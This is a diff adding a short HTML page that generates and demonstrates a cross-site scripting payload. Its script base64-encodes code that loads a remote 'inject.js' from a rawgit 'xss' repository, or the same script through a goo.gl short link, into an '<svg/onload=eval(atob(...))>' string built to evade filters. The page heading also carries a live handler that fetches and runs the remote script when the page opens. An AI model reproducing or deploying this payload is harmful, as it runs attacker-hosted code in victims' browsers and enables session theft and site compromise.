@@ -1,0 +1,18 @@
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+	<script type="text/javascript">
+		url = "https://rawgit.com/navneetkumar/xss/master/inject.js";
+		shorturl = "https://goo.gl/hKNba7";
+		nativeScript = "s=document.createElement('script');" + "s.src='" + url + "';" + "document.head.appendChild(s)";
+		jqueryScript = "$.getScript('" + shorturl + "')";
+		nativeEncoded = btoa(nativeScript);
+		jqueryEncoded = btoa(jqueryScript);
+		finalExecutable = "eval(atob('" + jqueryEncoded + "'))";
+		finalPayload = "<svg/onload=" + finalExecutable + ">";
+		console.log("Final eval string = ",finalExecutable);
+		console.log("Final payload string = ",finalPayload);
+	</script>
+</head>	
+<h1 class="page-title text-dark">Welcome<svg/onload=eval(atob(nativeEncoded));></h1>
+</html>
